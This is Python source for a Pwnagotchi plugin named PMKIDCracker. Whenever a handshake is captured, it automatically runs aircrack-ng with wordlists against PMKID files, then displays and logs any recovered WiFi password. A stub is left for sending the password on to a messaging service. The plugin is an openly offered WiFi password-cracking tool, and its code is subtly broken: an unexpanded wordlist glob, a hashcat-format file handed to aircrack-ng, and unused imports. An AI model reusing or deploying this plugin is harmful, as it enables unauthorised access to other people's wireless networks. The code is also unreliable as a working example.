import os
import logging
import subprocess
import re
import pwnagotchi.plugins as plugins
import qrcode
import io

class PMKIDCracker(plugins.Plugin):
    __GitHub__ = "https://github.com/sagarbanwa/"
    __author__ = 'SagarBanwa'
    __modified_by__ = '@sagarbanwa'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Extracts PMKID from handshakes and cracks the password'
    __name__ = 'PMKIDCracker'
    __help__ = 'Extracts PMKID and attempts to crack the password using a wordlist'
    __dependencies__ = {
        "apt": ["aircrack-ng", "hashcat"],
        "pip": [],
    }
    __defaults__ = {
        "enabled": False,
        "wordlist_folder": "/home/pi/wordlist/",
        "handshake_folder": "/root/handshakes/",
        "face": "(·ω·)",
        "api": None,
        "id": None,
    }

    def __init__(self):
        self.ready = False
        logging.debug(f"[{self.__class__.__name__}] Plugin initialized.")
        self.text_to_set = ""

    def on_loaded(self):
        logging.info(f"[{self.__class__.__name__}] Plugin loaded.")
        self.options.setdefault("face", "(·ω·)")
        self.options.setdefault("wordlist_folder", "/home/pi/wordlist/")
        self.options.setdefault("handshake_folder", "/root/handshakes/")
        self.options.setdefault("enabled", False)

    def on_handshake(self, agent, filename, access_point, client_station):
        # Check if the handshake is a PMKID file
        if filename.endswith('.16800'):
            self._crack_pmkid(filename)

    def _crack_pmkid(self, pmkid_file):
        logging.info(f"[{self.__class__.__name__}] Cracking PMKID file: {pmkid_file}")
        wordlist_files = os.path.join(self.options["wordlist_folder"], "*.txt")
        
        # Prepare aircrack-ng command
        crack_command = [
            "aircrack-ng", pmkid_file, "-w", wordlist_files, "-l", pmkid_file + ".cracked"
        ]

        try:
            result_crack = subprocess.run(crack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result_crack_output = result_crack.stdout.decode()

            logging.info(f"[{self.__class__.__name__}] Crack result: {result_crack_output}")

            if "KEY NOT FOUND" not in result_crack_output:
                key = re.search(r"\[(.*?)\]", result_crack_output)
                if key:
                    pwd = key.group(1)
                    self.text_to_set = f"Cracked password: {pwd}"
                    self._send_message(pmkid_file, pwd)
                else:
                    self.text_to_set = "Password could not be extracted."
            else:
                self.text_to_set = "Key not found in wordlist."
        except Exception as e:
            logging.error(f"[{self.__class__.__name__}] Error cracking PMKID: {str(e)}")
            self.text_to_set = "Error cracking PMKID. Check logs."

    def _send_message(self, pmkid_file, pwd):
        # Implement your messaging logic here (e.g., send to Telegram)
        logging.info(f"[{self.__class__.__name__}] PMKID Cracked! Password: {pwd} for file: {pmkid_file}")

    def on_ui_update(self, ui):
        if self.text_to_set:
            ui.set("face", self.options["face"])
            ui.set("status", self.text_to_set)
            self.text_to_set = ""

    def on_unload(self, ui):
        logging.info(f"[{self.__class__.__name__}] Plugin unloaded.")
